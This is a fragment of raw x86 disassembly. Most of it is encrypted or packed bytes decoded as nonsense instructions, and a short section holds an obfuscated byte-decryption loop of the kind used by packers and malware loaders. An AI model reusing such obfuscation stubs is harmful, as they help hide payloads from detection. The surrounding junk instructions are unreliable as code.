  42165a:	mov    ebp,0xf7f5e6f4
  42165f:	or     cl,bl
  421661:	or     eax,ebx
  421663:	push   es
  421664:	ret    0xb7d1
  421667:	loopne 0x421638
  421669:	scas   al,BYTE PTR es:[edi]
  42166a:	in     eax,dx
  42166b:	repnz icebp 
  42166d:	shl    DWORD PTR [edi-0x14001b10],1
  421673:	(bad)  
  421675:	mov    ecx,0xc1ccf5bc
  42167a:	ret    0xda05
  42167d:	fmul   st,st(7)
  42167f:	mov    esp,0xdee3fd0a
  421684:	icebp  
  421685:	xlat   BYTE PTR ds:[ebx]
  421686:	out    dx,eax
  421687:	icebp  
  421688:	mov    cl,0xe5
  42168a:	mov    dh,0xe0
  42168c:	mov    ch,0xb8
  42168e:	in     eax,dx
  42168f:	clc    
  421690:	mov    edi,0xe2cdefb5
  421695:	call   0xe148ee4f
  42169a:	stc    
  42169b:	(bad)  
  42169d:	add    ebx,esp
  42169f:	out    dx,al
  4216a0:	fsubp  st(4),st
  4216a2:	retf   
  4216a3:	add    ch,ch
  4216a5:	xlat   BYTE PTR ds:[ebx]
  4216a6:	mov    bh,0xc6
  4216a8:	retf   
  4216a9:	retf   0xfbfa
  4216ac:	rcl    cl,0xd8
  4216af:	mov    edx,0xbfe9ccd9
  4216b4:	mov    bh,0xce
  4216b6:	sar    BYTE PTR [eax+0xe5bac7],1
  4216bc:	in     eax,0xc7
  4216be:	invd   
  4216c0:	hlt    
  4216c1:	in     al,dx
  4216c2:	sti    
  4216c3:	loop   0x421684
  4216c5:	into   
  4216c6:	mov    cl,0xd2
  4216c8:	repnz lods eax,DWORD PTR ds:[esi]
  4216ca:	fcmove st,st(3)
  4216cc:	(bad)  
  4216cd:	int    0xd2
  4216cf:	fst    st(5)
  4216d1:	leave  
  4216d2:	aam    0xe2
  4216d4:	loope  0x4216a9
  4216d6:	jecxz  0x42169a
  4216d8:	jecxz  0x4216c6
  4216da:	aam    0xdf
  4216dc:	(bad)  
  4216dd:	in     al,0xf9
  4216df:	mov    DWORD PTR [edx],0xefe10fc9
  4216e5:	(bad)  
  4216e6:	out    0xf7,eax
  4216e8:	mov    bh,0xd4
  4216ea:	(bad)  
  4216eb:	(bad)  
  4216ec:	fxch   st(0)
  4216ee:	(bad)
  4216f1:	rcl    ecx,cl
  4216f3:	xlat   BYTE PTR ds:[ebx]
  4216f4:	ret    
  4216f5:	aam    0x2
  4216f7:	into   
  4216f8:	lock repnz div eax
  4216fc:	clc    
  4216fd:	jmp    eax
  4216ff:	jecxz  0x421708
  421701:	(bad)  
  421702:	ficom  WORD PTR [ebx]
  421704:	iret   
  421705:	mov    cl,0xbe
  421707:	lods   eax,DWORD PTR ds:[esi]
  421708:	lods   eax,DWORD PTR ds:[esi]
  421709:	test   edi,0xf0d7f6b0
  42170f:	in     eax,0xf3
  421711:	(bad)  
  421713:	out    dx,al
  421714:	std    
  421715:	ret    
  421716:	shl    dh,1
  421718:	mov    esi,0xac2d9d1
  42171d:	pop    es
  42171e:	hlt    
  42171f:	into   
  421720:	or     eax,0xe1e805f3
  421725:	retf   
  421726:	mov    cl,0xcf
  421728:	shl    DWORD PTR [ebp-0x161a572b],0xe6
  42172f:	repz in al,0xce
  421732:	stc    
  421733:	sti    
  421734:	fmul   st(0),st
  421736:	rol    DWORD PTR ds:0xf2bcd9d2,0xc9
  42173d:	retf   
  42173e:	out    dx,al
  42173f:	aad    0xd4
  421741:	or     eax,0xded1e4c4
  421746:	shr    ch,0xc5
  421749:	out    dx,al
  42174a:	mov    ebx,0xb0b1c7ac
  42174f:	mov    dh,0xb6
  421751:	stc    
  421752:	retf   
  421753:	add    esi,ebx
  421755:	loope  0x42173d
  421757:	cli    
  421758:	pop    es
  421759:	repz (bad) 
  42175b:	fnop   
  42175d:	ffree  st(1)
  42175f:	push   es
  421760:	out    0xc9,al
  421762:	add    eax,esp
  421764:	rcl    bh,1
  421766:	enter  0xe4b2,0xec
  42176a:	fcmovnbe st,st(0)
  42176c:	jmp    0x421769
  42176e:	retf   0xfdce
  421771:	mov    esi,0xbdd6feb5
  421776:	aad    0xff
  421778:	(bad)  
  42177a:	icebp  
  42177b:	fsubp  st(0),st
  42177d:	fdiv   st,st(5)
  42177f:	jmp    0xec4ee363
  421784:	jmp    0xd6c6:0xe5c0ebf1
  42178b:	mov    al,0xf0
  42178d:	jmp    0x42178e
  42178f:	stc    
  421790:	jmp    0x2ba:0xd3f6bcea
  421797:	out    0x3,al
  421799:	std    
  42179a:	(bad)  
  42179b:	lock hlt 
  42179d:	push   es
  42179e:	pop    es
  42179f:	or     al,bl
  4217a1:	(bad)  
  4217a3:	repz (bad) 
  4217a6:	xlat   BYTE PTR ds:[ebx]
  4217a7:	loope  0x421799
  4217a9:	aam    0xb6
  4217ab:	mov    ch,0xd2
  4217ad:	repnz mov ah,0xff
  4217b0:	(bad)
  4217b3:	mov    edx,0xb8d0dcfa
  4217b8:	mov    ebp,0xc3c2d2f4
  4217bd:	loopne 0x4217c8
  4217bf:	test   BYTE PTR [ebx],0xe9
  4217c2:	or     BYTE PTR [eax+edi*4],al
  4217c5:	out    dx,eax
  4217c6:	jmp    0xe916feba
  4217cb:	xlat   BYTE PTR ds:[ebx]
  4217cc:	mov    edx,0xf7fefeb7
  4217d1:	mov    ecx,0xd5eedced
  4217d6:	push   es
  4217d7:	mul    al
  4217d9:	(bad)  
  4217da:	(bad)  
  4217dc:	add    ecx,eax
  4217de:	call   0xdc4edca8
  4217e3:	adc    DWORD PTR [edx-0x4c421352],ebp
  4217e9:	retf   
  4217ea:	ret    0xf1e8
  4217ed:	not    edi
  4217ef:	shl    edi,1
  4217f1:	rol    BYTE PTR [ebx],cl
  4217f3:	fsubp  st(6),st
  4217f5:	(bad)  
  4217f7:	add    eax,0xdcf0f2e0
  4217fc:	cld    
  4217fd:	jmp    0x4217c5
  4217ff:	in     eax,0xe3
  421801:	(bad)
  421804:	enter  0xd1a9,0xe1
  421808:	repz shr esp,1
  42180b:	test   ah,0xc4
  42180e:	leave  
  42180f:	int    0xd1
  421811:	jmp    0xbf310519
  421816:	neg    edi
  421818:	repz ret 
  42181a:	lock aad 0xcb
  42181d:	ret    0xcaf5
  421820:	retf   
  421821:	in     eax,dx
  421822:	cld    
  421823:	jmp    0xd1e0:0xd7b2f3d1
  42182a:	loopne 0x421826
  42182c:	in     al,0xe7
  42182e:	int3   
  42182f:	call   0xd718e6f3
  421834:	iret   
  421835:	in     al,dx
  421836:	xlat   BYTE PTR ds:[ebx]
  421837:	std    
  421838:	(bad)  
  42183a:	jecxz  0x421830
  42183c:	fild   DWORD PTR [esi]
  42183e:	or     eax,esi
  421840:	in     al,dx
  421841:	pop    es
  421842:	or     DWORD PTR [eax],ecx
  421844:	lock repnz mov al,0xde
  421848:	ret    
  421849:	mov    bl,0xea
  42184b:	(bad)
  42184e:	(bad)  
  42184f:	in     al,dx
  421850:	hlt    
  421851:	fcom   st(7)
  421853:	sar    DWORD PTR [esi-0x4fc270e],cl
  421859:	shl    ch,1
  42185b:	out    0xe9,eax
  42185d:	pop    es
  42185e:	out    0xe2,al
  421860:	cmc    
  421861:	iret   
  421862:	ficom  DWORD PTR [ecx]
  421864:	(bad)  
  421865:	into   
  421866:	mov    al,0xbe
  421868:	(bad)  
  421869:	rol    ebp,cl
  42186b:	in     eax,0xb1
  42186d:	int    0xf9
  42186f:	(bad)  
  421871:	mov    dh,0xfc
  421873:	rcl    esi,1
  421875:	jecxz  0x421875
  421877:	(bad)  
  421879:	push   es
  42187a:	sar    bl,1
  42187c:	cmc    
  42187d:	hlt    
  42187e:	pop    es
  42187f:	loop   0x42186f
  421881:	push   es
  421882:	pop    es
  421883:	add    al,0xd9
  421885:	repz mov dl,0xcf
  421888:	icebp  
  421889:	in     eax,0xd0
  42188b:	(bad)
  42188e:	rcl    ah,1
  421890:	test   cl,0xbf
  421893:	mov    edi,0xf9e1c3d7
  421898:	int    0xe7
  42189a:	(bad)  
  42189b:	aam    0xb
  42189d:	push   es
  42189e:	loope  0x421867
  4218a0:	out    0x5,eax
  4218a2:	fmul   QWORD PTR [eax]
  4218a4:	ror    dl,0xcb
  4218a7:	mov    dh,0xd1
  4218a9:	(bad)  
  4218ab:	imul   eax
  4218ad:	imul   al
  4218af:	fcmovne st,st(7)
  4218b1:	clc    
  4218b2:	retf   0xf0c9
  4218b5:	stc    
  4218b6:	hlt    
  4218b7:	repnz fdiv st(7),st
  4218ba:	idiv   DWORD PTR [eax-0x4330273d]
  4218c0:	aad    0xc9
  4218c2:	stc    
  4218c3:	loopne 0x421884
  4218c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218c6:	test   al,0xb7
  4218c8:	repz jmp 0xf8e4:0xe7d3a8e3
  4218d0:	fadd   st(4),st
  4218d2:	(bad)  
  4218d4:	out    dx,al
  4218d5:	into   
  4218d6:	fsubr  st(0),st
  4218d8:	int3   
  4218d9:	(bad)  
  4218da:	(bad)  
  4218db:	std    
  4218dc:	lock retf 0xbcfb
  4218e0:	cli    
  4218e1:	add    ah,dl
  4218e3:	out    dx,eax
  4218e4:	leave  
  4218e5:	fdivr  QWORD PTR [edi-0x4b151650]
  4218eb:	mov    edx,0xf6f0d4d7
  4218f0:	mov    ebp,0xceded8d1
  4218f5:	std    
  4218f6:	sar    esi,cl
  4218f8:	rcr    ch,1
  4218fa:	ret    
  4218fb:	ret    
  4218fc:	(bad)  
  4218fe:	(bad)  
  4218ff:	fdivrp st(4),st
  421901:	in     al,0xc1
  421903:	out    0xd0,al
  421905:	mov    edi,0xb1edeaee
  42190a:	(bad)
  42190d:	aad    0xd9
  42190f:	jmp    0xbc24e4cb
  421914:	repz out dx,eax
  421916:	jecxz  0x4218f7
  421918:	mov    edi,0xfe04d5c2
  42191d:	fcmovnb st,st(0)
  42191f:	in     eax,dx
  421920:	add    ebx,eax
  421922:	clc    
  421923:	int3   
  421924:	leave  
  421925:	repnz out 0xf5,eax
  421928:	(bad)  
  42192a:	mov    bl,0xd5
  42192c:	retf   
  42192d:	leave  
  42192e:	shr    ebp,cl
  421930:	mov    bl,0xf2
  421932:	leave  
  421933:	repz into 
  421935:	aam    0xf7
  421937:	mov    DWORD PTR [ebx],0xe0ffc4f5
  42193d:	mul    esp
  42193f:	add    eax,esi
  421941:	fcmovnu st,st(3)
  421943:	out    0xcd,al
  421945:	repz out dx,eax
  421947:	into   
  421948:	out    0xc0,al
  42194a:	lds    esi,FWORD PTR [edi-0x141a283a]
  421950:	in     eax,dx
  421951:	fdivr  st(0),st
  421953:	mov    edx,0xd7ce03d4
  421958:	in     eax,dx
  421959:	loop   0x42194d
  42195b:	jmp    0xc80c:0xff00e2f6
  421962:	sar    esi,cl
  421964:	retf   0xbfc3
  421967:	lock mov ch,0xf4
  42196a:	loop   0x42194d
  42196c:	sar    BYTE PTR [edx-0x4b422a4a],1
  421972:	fcmovu st,st(4)
  421974:	xlat   BYTE PTR ds:[ebx]
  421975:	fdivrp st(2),st
  421977:	into   
  421978:	shl    esi,cl
  42197a:	in     al,0xe6
  42197c:	add    cl,bh
  42197e:	fst    st(4)
  421980:	pmulhw mm3,mm6
  421983:	add    al,0xf1
  421985:	scas   al,BYTE PTR es:[edi]
  421986:	mov    esi,0xa9b3d7af
  42198b:	retf   
  42198c:	mov    al,0xbb
  42198e:	into   
  42198f:	idiv   ecx
  421991:	into   
  421992:	mov    ebx,0xb9cde1d2
  421997:	mov    ebp,0xc4c4c5f0
  42199c:	(bad)  
  42199e:	mov    ebp,0xe5d908e1
  4219a3:	repnz retf 
  4219a5:	out    dx,eax
  4219a6:	test   edx,0xb1cef4b2
  4219ac:	leave  
  4219ad:	repnz in eax,0xd0
  4219b0:	repnz mov dh,0xb5
  4219b3:	(bad)  
  4219b4:	(bad)  
  4219b6:	in     eax,dx
  4219b7:	test   edx,0xdfd9c5f6
  4219bd:	idiv   BYTE PTR [ebp-0x3043c3b]
  4219c3:	in     al,dx
  4219c4:	sar    DWORD PTR [eax-0x8324f39],cl
  4219ca:	jmp    0xd7cc:0xf1cfdae7
  4219d1:	stc    
  4219d2:	clc    
  4219d3:	fsub   st,st(2)
  4219d5:	jecxz  0x4219d4
  4219d7:	pop    es
  4219d8:	sar    ebp,cl
  4219da:	(bad)  
  4219db:	std    
  4219dc:	retf   
  4219dd:	fimul  DWORD PTR [eax]
  4219df:	leave  
  4219e0:	hlt    
  4219e1:	lds    eax,FWORD PTR [ebx]
  4219e3:	adc    ebp,DWORD PTR [edi-0x3f182d57]
  4219e9:	enter  0xf3b4,0xd0
  4219ed:	(bad)
  4219f0:	jmp    0xb7faedf3
  4219f5:	xlat   BYTE PTR ds:[ebx]
  4219f6:	out    0xf3,eax
  4219f8:	xlat   BYTE PTR ds:[ebx]
  4219f9:	(bad)  
  4219fa:	rol    DWORD PTR [edx+ebx*8],1
  4219fd:	add    ah,cl
  4219ff:	or     cl,dh
  421a01:	in     eax,0xf8
  421a03:	call   0xe235e6e9
  421a08:	mul    bh
  421a0a:	mov    bh,0xc9
  421a0c:	out    0xe9,al
  421a0e:	out    dx,eax
  421a0f:	cli    
  421a10:	int3   
  421a11:	iret   
  421a12:	(bad)  
  421a13:	cmc    
  421a14:	idiv   BYTE PTR [eax-0x24030c1a]
  421a1a:	mov    ecx,0xe9fd03f4
  421a1f:	sti    
  421a20:	out    dx,al
  421a21:	aam    0xa
  421a23:	(bad)  
  421a25:	fdivrp st(7),st
  421a27:	shr    bh,cl
  421a29:	fdivr  st(0),st
  421a2b:	in     al,dx
  421a2c:	int    0xf6
  421a2e:	dec    ebx
  421a30:	aam    0xe4
  421a32:	fdiv   st,st(7)
  421a34:	test   ecx,0xbc2dcf9
  421a3a:	fdivr  st(4),st
  421a3c:	fcmovnb st,st(2)
  421a3e:	test   ebp,0xd9deffce
  421a44:	fsubr  st(1),st
  421a46:	mov    al,0xc9
  421a48:	(bad)  
  421a4a:	(bad)  
  421a4b:	jmp    0xc711fa40
  421a50:	mov    bl,0xe3
  421a52:	cli    
  421a53:	mov    ebp,0xe6f0ddf7
  421a58:	loopne 0x421a60
  421a5a:	(bad)
  421a5d:	fsubp  st(1),st
  421a5f:	retf   
  421a60:	leave  
  421a61:	or     eax,0xa8acdfce
  421a66:	test   al,0xb2
  421a68:	(bad)  
  421a69:	loop   0x421a66
  421a6b:	cli    
  421a6c:	leave  
  421a6d:	jmp    0xe900f558
  421a72:	fscale 
  421a74:	(bad)  
  421a75:	add    bl,bh
  421a77:	cmc    
  421a78:	repnz pop es
  421a7a:	stc    
  421a7b:	mov    eax,0x506db02
  421a80:	add    dh,cl
  421a82:	rcl    ebx,cl
  421a84:	int3   
  421a85:	lods   eax,DWORD PTR ds:[esi]
  421a86:	test   ebp,0xf9f4fbf7
  421a8c:	out    dx,eax
  421a8d:	cmc    
  421a8e:	aad    0xc5
  421a90:	cld    
  421a91:	fidivr WORD PTR [esi-0x212a0507]
  421a97:	into   
  421a98:	(bad)  
  421a9a:	cli    
  421a9b:	pop    es
  421a9c:	or     esi,ebx
  421a9e:	hlt    
  421a9f:	(bad)  
  421aa1:	fcomip st,st(3)
  421aa3:	jmp    0x421a87
  421aa5:	in     al,0xc9
  421aa7:	mov    al,0xcf
  421aa9:	rcl    al,cl
  421aab:	enter  0xe7c6,0xcf
  421aaf:	leave  
  421ab0:	clc    
  421ab1:	cli    
  421ab2:	clc    
  421ab3:	mov    esp,0xbebcfccd
  421ab8:	aam    0xd9
  421aba:	fcmovb st,st(2)
  421abc:	ffreep st(7)
  421abe:	(bad)  
  421ac1:	fcos   
  421ac3:	adc    edx,ecx
  421ac5:	shl    esi,0xcf
  421ac8:	shl    DWORD PTR [edi-0xd4e0649],cl
  421ace:	in     eax,0xb7
  421ad0:	mov    dh,0xdd
  421ad2:	jecxz  0x421a8e
  421ad4:	loope  0x421a8e
  421ad6:	(bad)  
  421ad7:	mov    ah,0xf7
  421ad9:	sti    
  421ada:	(bad)  
  421adc:	(bad)  
  421add:	mov    esi,0x501d4bd
  421ae2:	std    
  421ae3:	jecxz  0x421ad3
  421ae5:	int    0xf0
  421ae7:	mov    esi,0xc7f4add1
  421aec:	fcmovnb st,st(6)
  421aee:	mov    ah,0xc6
  421af0:	repnz mov edx,0xe1d8d9fd
  421af6:	(bad)  
  421af8:	add    esi,esp
  421afa:	(bad)  
  421afb:	(bad)  
  421afd:	or     bh,ch
  421aff:	in     al,0x8
  421b01:	hlt    
  421b02:	int    0xf9
  421b04:	rcr    edi,cl
  421b06:	lods   al,BYTE PTR ds:[esi]
  421b07:	lods   eax,DWORD PTR ds:[esi]
  421b08:	loop   0x421ac0
  421b0a:	loop   0x421abc
  421b0c:	clc    
  421b0d:	mov    eax,0xd0caf9df
  421b12:	mov    ecx,0xf9bad1fc
  421b17:	(bad)  
  421b18:	fld    st(2)
  421b1a:	ror    BYTE PTR [ebx],0xc7
  421b1d:	add    al,0xf6
  421b1f:	(bad)  
  421b20:	stc    
  421b21:	or     al,0xe3
  421b23:	fucomip st,st(5)
  421b25:	lods   eax,DWORD PTR ds:[esi]
  421b26:	lods   eax,DWORD PTR ds:[esi]
  421b27:	jecxz  0x421ae5
  421b29:	aad    0xc1
  421b2b:	mov    edx,0xdeffc5d3
  421b30:	sar    eax,cl
  421b32:	icebp  
  421b33:	repz into 
  421b35:	fcomi  st,st(0)
  421b37:	repnz shl ch,0xda
  421b3b:	fld    QWORD PTR [eax]
  421b3d:	lock add edi,ebp
  421b40:	out    dx,eax
  421b41:	in     al,dx
  421b42:	psubsw mm4,mm7
  421b45:	retf   
  421b46:	test   ebp,0xacb3e3e8
  421b4c:	jmp    0xf100ea40
  421b51:	rcr    ebp,1
  421b53:	ror    cl,cl
  421b55:	ret    
  421b56:	div    ah
  421b58:	out    0xbd,al
  421b5a:	or     bh,BYTE PTR [eax-0x2a34f61f]
  421b60:	(bad)  
  421b62:	(bad)  
  421b63:	jmp    0xb3fec550
  421b68:	out    0xb2,eax
  421b6a:	test   eax,0xbae6efed
  421b6f:	clc    
  421b70:	mov    edx,0xdbe1bbd1
  421b75:	fst    st(6)
  421b77:	fiadd  WORD PTR [esi]
  421b79:	cmc    
  421b7a:	pop    es
  421b7b:	loopne 0x421b87
  421b7d:	(bad)  
  421b7e:	leave  
  421b7f:	iret   
  421b80:	in     eax,dx
  421b81:	adc    eax,DWORD PTR [edi+edi*8]
  421b84:	out    0xcd,al
  421b86:	fnsave [edx-0x2b2a0e14]
  421b8c:	mov    ebx,0xfbead0da
  421b91:	int    0xb5
  421b93:	sar    ebx,1
  421b95:	aad    0xcc
  421b97:	jecxz  0x421b75
  421b99:	std    
  421b9a:	add    al,0xf0
  421b9c:	stc    
  421b9d:	fucomip st,st(0)
  421b9f:	or     cl,ch
  421ba1:	int3   
  421ba2:	add    BYTE PTR [edi],al
  421ba4:	sar    BYTE PTR [esi-0x153b0c2f],cl
  421baa:	neg    cl
  421bac:	out    dx,eax
  421bad:	fucomi st,st(6)
  421baf:	shl    ebp,1
  421bb1:	mov    ch,0xed
  421bb3:	mov    ebx,0xe1dcdee3
  421bb8:	rol    dh,0xfe
  421bbb:	idiv   edi
  421bbd:	xlat   BYTE PTR ds:[ebx]
  421bbe:	xlat   BYTE PTR ds:[ebx]
  421bbf:	(bad)  
  421bc2:	retf   0xed12
  421bc5:	(bad)  
  421bc7:	test   al,0xb6
  421bca:	mov    eax,DWORD PTR [ebp-0x138]
  421bd0:	mov    eax,DWORD PTR [ebp+eax*4-0x130]
  421bd7:	add    eax,0x405fcdc
  421bdc:	mov    ecx,DWORD PTR [ebp-0x138]
  421be2:	mov    DWORD PTR [ebp+ecx*4-0x130],eax
  421be9:	jmp    0x421c0d
  421bee:	mov    eax,DWORD PTR [ebp-0x138]
  421bf4:	mov    eax,DWORD PTR [ebp+eax*4-0x130]
  421bfb:	sub    eax,0x250bcdc
  421c00:	mov    ecx,DWORD PTR [ebp-0x138]
  421c06:	mov    DWORD PTR [ebp+ecx*4-0x130],eax
  421c0d:	jmp    0x41d41c
  421c12:	cmp    DWORD PTR [ebp-0x140],0x0
  421c19:	jne    0x421c39
  421c1f:	movzx  eax,BYTE PTR [ebp-0x131]
  421c26:	xor    eax,0x83
  421c2b:	add    eax,0x8
  421c2e:	mov    BYTE PTR [ebp-0x131],al
  421c34:	jmp    0x421c78
  421c39:	mov    eax,DWORD PTR [ebp-0x110]
  421c3f:	xor    eax,0x75108b5
  421c44:	add    eax,0x3272fb
  421c49:	movzx  ecx,BYTE PTR [ebp-0x131]
  421c50:	sub    ecx,eax
  421c52:	mov    BYTE PTR [ebp-0x131],cl
  421c58:	mov    ecx,DWORD PTR [ebp-0x108]
  421c5e:	xor    ecx,0x75108b5
  421c64:	add    ecx,0x3272fb
  421c6a:	mov    al,BYTE PTR [ebp-0x131]
  421c70:	ror    al,cl
  421c72:	mov    BYTE PTR [ebp-0x131],al
  421c78:	xor    eax,eax
  421c7a:	mov    eax,DWORD PTR [ebp-0x8]
  421c7d:	add    eax,DWORD PTR [ebp-0x10c]
  421c83:	mov    cl,BYTE PTR [ebp-0x131]
  421c89:	mov    BYTE PTR [eax],cl
  421c8b:	mov    eax,DWORD PTR [ebp-0x10c]
  421c91:	sub    eax,0x3272fb
  421c96:	xor    eax,0x75108b5
  421c9b:	cmp    eax,DWORD PTR [ebp-0x118]
  421ca1:	jne    0x421cfe
  421ca7:	mov    eax,DWORD PTR [ebp-0x104]
  421cad:	xor    eax,0x75108b5
  421cb2:	add    eax,0x3272fb
  421cb7:	mov    ecx,DWORD PTR [ebp-0x11c]
  421cbd:	xor    ecx,0x75108b5
  421cc3:	add    ecx,0x3272fb
  421cc9:	sub    eax,ecx
  421ccb:	sub    eax,0x3272fb
  421cd0:	xor    eax,0x75108b5
  421cd5:	mov    DWORD PTR [ebp-0x104],eax
  421cdb:	mov    eax,DWORD PTR [ebp-0x11c]
  421ce1:	xor    eax,0x75108b5
  421ce6:	add    eax,0x3272fb
  421ceb:	mov    ecx,DWORD PTR [ebp-0x13c]
  421cf1:	sub    ecx,eax
  421cf3:	mov    DWORD PTR [ebp-0x10c],ecx
  421cf9:	jmp    0x421d1c
  421cfe:	mov    eax,DWORD PTR [ebp-0x11c]
  421d04:	xor    eax,0x75108b5
  421d09:	add    eax,0x3272fb
  421d0e:	mov    ecx,DWORD PTR [ebp-0x10c]
  421d14:	sub    ecx,eax
  421d16:	mov    DWORD PTR [ebp-0x10c],ecx
  421d1c:	jmp    0x41afe6
  421d21:	mov    eax,DWORD PTR [ebp+0x8]
  421d24:	jmp    0x4240ca
  421d29:	mov    eax,ds:0x66e06a5
  421d2e:	ins    BYTE PTR es:[edi],dx
  421d2f:	icebp  
  421d30:	je     0x421cd7
  421d32:	pop    ebx
  421d33:	rcr    BYTE PTR gs:[edx+0x5de9862d],cl
  421d3a:	inc    eax
  421d3b:	jp     0x421db8
  421d3d:	add    bl,BYTE PTR [eax-0x2a4e8485]
  421d43:	mov    bh,0xee
  421d45:	mov    bh,0xfa
  421d47:	cmc    
  421d48:	rcl    ebx,1
  421d4a:	mov    al,0xd2
  421d4c:	in     al,dx
  421d4d:	out    dx,al
  421d4e:	sar    BYTE PTR [ebx-0x232528fa],1
  421d54:	loope  0x421d4f
  421d56:	fisttp WORD PTR ds:0xafd80fc2
  421d5c:	mov    edi,0xb2e2afe4
  421d61:	jecxz  0x421d5a
  421d63:	out    0xf0,eax
  421d65:	(bad)  
  421d66:	out    dx,eax
  421d67:	mov    ebx,0xfab9e9d5
  421d6c:	rcl    bh,cl
  421d6e:	rcl    edi,1
  421d70:	out    0xf3,eax
  421d72:	loop   0x421d54
  421d74:	jecxz  0x421d7f
  421d76:	les    eax,FWORD PTR [esp+ebx*8]
  421d79:	jmp    0x421d7b
  421d7b:	out    0xc8,al
  421d7d:	mov    esi,0xe2d3b1f7
  421d82:	loopne 0x421d76
  421d84:	cmc    
  421d85:	retf   
  421d86:	in     al,dx
  421d87:	ror    ecx,cl
  421d89:	cld    
  421d8a:	fstp   st(3)
  421d8c:	repnz (bad) 
  421d8e:	cli    
  421d8f:	fdivrp st(1),st
  421d91:	jmp    0x421d6b
  421d93:	pop    es
  421d94:	push   es
  421d95:	cmc    
  421d96:	mov    DWORD PTR [ecx+eiz*8],0xc4cc0bc4
  421d9d:	ffreep st(5)
  421d9f:	mov    dl,0xcf
  421da1:	call   0xfa18ea57
  421da6:	repnz sti 
  421da8:	cmc    
  421da9:	call   0xde001698
  421dae:	push   es
  421daf:	idiv   ebx
  421db1:	cmc    
  421db2:	ror    DWORD PTR [ecx],0xc1
  421db5:	sar    bl,0x6
  421db8:	fchs   
  421dba:	out    0xe3,eax
  421dbc:	fdiv   st,st(1)
  421dbe:	xlat   BYTE PTR ds:[ebx]
  421dbf:	loop   0x421dbc
  421dc1:	cmc    
  421dc2:	into   
  421dc3:	div    DWORD PTR [edi+ebp*8-0x10130054]
  421dca:	shl    esp,cl
  421dcc:	fchs   
  421dce:	div    edx
  421dd0:	neg    ch
  421dd2:	cli    
  421dd3:	jmp    0xf05:0x1dc09f6
  421dda:	rcl    ebx,cl
  421ddc:	scas   al,BYTE PTR es:[edi]
  421ddd:	mov    bh,0xcb
  421ddf:	(bad)  
  421de0:	rol    ebp,1
  421de2:	test   al,0xda
  421de4:	into   
  421de5:	rcl    ah,cl
  421de7:	jmp    0xecf8:0xefe1dccf
  421dee:	fild   WORD PTR [esi]
  421df0:	rol    BYTE PTR [ebx],cl
  421df2:	(bad)  
  421df4:	cld    
  421df5:	or     dh,dh
  421df7:	int    0xff
  421df9:	adc    esp,edi
  421dfb:	jmp    0x421dd0
  421dfd:	mov    edi,0xe8c0eccc
  421e02:	mov    ah,0xdb
  421e04:	mov    ecx,0xd3f7d8ef
  421e09:	mov    cl,0xef
  421e0b:	loope  0x421e01
  421e0d:	shl    ch,1
  421e0f:	cli    
  421e10:	int3   
  421e11:	loopne 0x421de3
  421e13:	add    DWORD PTR [esi+edx*8],eax
  421e16:	mov    DWORD PTR [edx],0xa912e7fe
  421e1c:	mov    al,0xe1
  421e1e:	mov    bh,0xb5
  421e20:	(bad)  [ebx-0x3535140a]
  421e26:	out    dx,al
  421e27:	hlt    
  421e28:	mov    dl,0xcf
  421e2a:	mov    al,0xd2
  421e2c:	clc    
  421e2d:	inc    DWORD PTR [edx]
  421e2f:	loopne 0x421e36
  421e31:	add    dl,ah
  421e33:	out    0xc5,eax
  421e35:	mov    dh,0xdf
  421e38:	out    dx,al
  421e39:	or     ah,ch
  421e3b:	int    0xd0
  421e3d:	int    0xe8
  421e3f:	loope  0x421e13
  421e41:	mov    bl,0xea
  421e43:	in     eax,dx
  421e44:	mov    al,0xb8
  421e46:	fmul   st,st(4)
  421e48:	int3   
  421e49:	mov    ebp,0xccf2f2bd
  421e4e:	int3   
  421e4f:	pop    es
  421e50:	loope  0x421e47
  421e52:	(bad)  
  421e54:	dec    DWORD PTR [edi]
  421e56:	mov    esp,0xcfa0fd5
  421e5b:	mov    esp,0xd0eaecc0
  421e60:	shr    eax,0xb5
  421e63:	call   0xd028da3d
  421e68:	into   
  421e69:	repnz leave 
  421e6b:	(bad)  
  421e6c:	sar    bl,1
  421e6e:	int    0x6
  421e70:	add    eax,0xf8f0c5e2
  421e75:	retf   0xc3db
  421e78:	or     BYTE PTR [ebx],al
  421e7a:	out    dx,eax
  421e7b:	vpsraw xmm2,xmm7,xmm2
  421e7f:	shr    edx,cl
  421e81:	ror    bh,1
  421e83:	enter  0xf3b6,0xeb
  421e87:	(bad)
  421e8a:	add    edi,ecx
  421e8c:	fcmove st,st(4)
  421e8e:	(bad)  
  421e8f:	in     al,dx
  421e90:	lock repnz in eax,0xcb
  421e94:	push   es
  421e95:	dec    DWORD PTR [edi]
  421e97:	clc    
  421e98:	add    al,0xe7
  421e9a:	rcl    ecx,cl
  421e9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e9d:	test   cl,0xec
  421ea0:	loop   0x421e92
  421ea2:	rcl    esp,1
  421ea4:	(bad)
  421ea7:	xlat   BYTE PTR ds:[ebx]
  421ea8:	jecxz  0x421e78
  421eaa:	clc    
  421eab:	mov    esi,0x5f6fef7
  421eb0:	fcmovnbe st,st(6)
  421eb2:	(bad)  
  421eb3:	(bad)  
  421eb4:	enter  0xbc0,0xe8
  421eb8:	fcomp  st(6)
  421eba:	jmp    0xc9ae:0xd6eef2cd
  421ec1:	retf   0xc5ed
  421ec4:	les    edi,FWORD PTR [eax-0x4032307]
  421eca:	out    dx,eax
  421ecb:	(bad)  
  421ecd:	out    0xfb,eax
  421ecf:	rcr    ecx,1
  421ed1:	in     al,0x3
  421ed3:	fdivp  st(6),st
  421ed5:	clc    
  421ed6:	shl    ch,0xc8
  421ed9:	add    ecx,ebp
  421edb:	repnz lods eax,DWORD PTR ds:[esi]
  421edd:	ret    
  421ede:	fisubr WORD PTR [ebx-0x4917361f]
  421ee4:	in     eax,dx
  421ee5:	enter  0xd5d8,0xdd
  421ee9:	aam    0xd6
  421eeb:	fdivp  st(2),st
  421eed:	pop    es
  421eee:	loope  0x421ef3
  421ef0:	lock stc 
  421ef2:	test   BYTE PTR [ecx],0xe9
  421ef5:	shl    esi,0xcb
  421ef8:	cld    
  421ef9:	or     edi,esp
  421efb:	call   0xf0f311d3
  421f00:	out    0xcb,al
  421f02:	mov    bl,0xb1
  421f04:	ror    ecx,1
  421f06:	leave  
  421f07:	rcr    eax,cl
  421f09:	fdivr  st,st(7)
  421f0b:	cli    
  421f0c:	fadd   st,st(3)
  421f0e:	in     eax,dx
  421f0f:	sar    bl,0xc0
  421f12:	(bad)  
  421f13:	loopne 0x421f19
  421f15:	add    ecx,ecx
  421f17:	jmp    esp
  421f19:	add    bl,dh
